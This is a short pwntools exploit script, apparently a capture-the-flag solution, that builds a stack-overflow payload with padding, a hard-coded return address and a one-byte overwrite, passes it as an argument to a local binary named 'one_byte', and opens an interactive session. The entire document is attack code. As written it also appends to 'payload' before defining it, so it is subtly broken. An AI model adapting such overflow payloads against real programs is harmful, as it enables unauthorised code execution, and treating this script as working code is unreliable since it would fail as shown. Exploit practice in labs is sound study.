from pwn import *

context.log_level = "debug"

payload += "A" * 988
payload += p32(0x08048486)
payload += "B" * 32
payload += p32(0xffffffff)
payload += "C" * 8
payload += "\x04"

p = process(["./one_byte",payload])

p.interactive()
